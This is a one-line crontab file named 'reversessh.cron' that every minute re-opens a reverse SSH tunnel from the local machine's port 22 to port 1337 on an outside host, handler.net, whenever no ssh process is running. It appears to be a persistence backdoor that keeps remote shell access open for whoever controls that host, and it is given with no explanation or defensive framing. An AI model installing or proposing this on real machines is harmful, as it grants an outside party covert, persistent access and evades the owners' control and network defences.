# reversessh.cron
*/1 * * * * [ -z $(pidof ssh) ] && ssh -fN -R 1337:localhost:22 z@handler.net
